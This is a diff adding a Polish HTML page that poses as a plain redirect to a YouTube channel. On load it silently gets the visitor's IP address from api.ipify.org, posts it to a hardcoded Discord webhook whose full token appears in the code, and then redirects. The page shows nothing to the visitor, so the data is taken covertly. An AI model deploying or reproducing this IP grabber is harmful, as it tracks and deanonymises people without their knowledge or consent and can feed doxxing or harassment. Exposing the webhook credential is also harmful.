@@ -1,0 +1,66 @@
+<!DOCTYPE html>
+<html lang="pl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Przekierowanie z IP</title>
+    <script>
+        // Webhook Discorda (zamień na swój własny URL)
+        const webhookURL = 'https://discord.com/api/webhooks/1305558422699380736/AwJjFMHHZSVQN015I2-swpU_hwaczLbstNCXzz-HhPaq3Zf5rSlw2xUW4QrkIUPAakDg';
+
+        // URL do przekierowania
+        const redirectURL = 'https://www.youtube.com/@e__s0';
+
+        // Funkcja do wysyłania IP do Discorda
+        function sendIPToDiscord(ip) {
+            const payload = {
+                content: `Nowy użytkownik wszedł na stronę. IP: ${ip}`
+            };
+
+            fetch(webhookURL, {
+                method: 'POST',
+                headers: {
+                    'Content-Type': 'application/json'
+                },
+                body: JSON.stringify(payload)
+            })
+            .then(response => {
+                if (response.ok) {
+                    console.log('IP wysłane na Discorda');
+                } else {
+                    console.error('Błąd przy wysyłaniu na Discorda: ', response.statusText);
+                }
+            })
+            .catch(error => {
+                console.error('Błąd: ', error);
+            });
+        }
+
+        // Funkcja do uzyskiwania IP i przekierowywania
+        function redirectWithIP() {
+            // Uzyskiwanie IP użytkownika z api.ipify.org
+            fetch('https://api.ipify.org?format=json')
+                .then(response => response.json())
+                .then(data => {
+                    const userIP = data.ip;
+                    console.log('Adres IP użytkownika:', userIP);
+                    
+                    // Wysyłanie IP do Discorda
+                    sendIPToDiscord(userIP);
+
+                    // Po wysłaniu IP przekierowanie na stronę YouTube
+                    window.location.href = redirectURL;
+                })
+                .catch(error => {
+                    console.error('Błąd przy uzyskiwaniu IP: ', error);
+                });
+        }
+
+        // Wywołanie funkcji po załadowaniu strony
+        window.onload = redirectWithIP;
+    </script>
+</head>
+<body>
+    <!-- Brak jakiegokolwiek widocznego elementu -->
+</body>
+</html>
